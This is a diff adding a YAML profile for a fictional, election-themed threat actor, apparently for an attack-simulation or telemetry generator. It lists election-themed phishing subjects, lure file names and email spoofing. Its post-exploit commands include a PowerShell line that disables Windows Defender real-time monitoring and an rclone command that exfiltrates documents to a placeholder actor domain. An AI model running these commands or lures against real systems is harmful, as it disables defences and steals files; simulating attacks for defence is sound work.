@@ -1,0 +1,78 @@
+name: ZoranianElections
+effectiveness: 85
+count_init_passive_dns: 15
+max_wave_size: 4
+attacks:
+  - recon:browsing
+  - email:malware_delivery
+  - delivery:supply_chain
+domain_themes:
+  - election
+  - campaign
+  - polling
+  - voting
+  - democracy
+  - opposition
+  - corruption
+  - ballot
+  - candidate
+  - propaganda
+  - mandate
+sender_themes:
+  - pollster
+  - strategist
+  - campaigner
+  - lobbyist
+  - activist
+  - volunteer
+subjects:
+  - "Urgent request for your opinion on the upcoming elections"
+  - "Invitation to exclusive election briefing"
+  - "Reminder: Complete your mandatory election training"
+  - "Your vote matters: cast it safely"
+  - "Confirm your voter registration details"
+  - "Notification of polling station change"
+  - "Results of the latest public opinion poll"
+  - "Breaking news: opposition candidate scandal"
+recon_search_terms:
+  - election rigging techniques
+  - opposition campaign strategy
+  - voting machine vulnerabilities
+  - foreign interference in elections
+  - voter data manipulation
+  - campaign funding sources
+  - fake news election propaganda
+  - social media influence on elections
+file_names:
+  - Voter-Registration-Database.xlsx
+  - Polling-Station-Locations.docx
+  - Election-Observer-Training-Manual.pdf
+  - Campaign-Finance-Records.xls
+  - Opposition-Research-Briefing.docx
+  - Voter-Data-Analysis-Report.docx
+  - Election-Results-Reporting-Tool.exe
+  - Social-Media-Monitoring-Software.exe
+  - Election-Infrastructure-Vulnerability-Assessment.docx
+  - Election-Day-Playbook.docx
+tlds:
+  - com
+  - org
+  - gov
+spoofs_email: True
+malware:
+  - ballotbox
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe dirr
+  - name: cmd.exe
+    process: cmd.exe dir
+  - name: cmd.exe
+    process: "cmd.exe dir C:\\"
+  - name: cmd.exe
+    process: "cmd.exe dir E:\\"
+  - name: cmd.exe
+    process: "cmd.exe cd Documents"
+  - name: cmd.exe
+    process: "cmd.exe powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+  - name: rclone.exe 
+    process: 'rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" {actor_domain}'
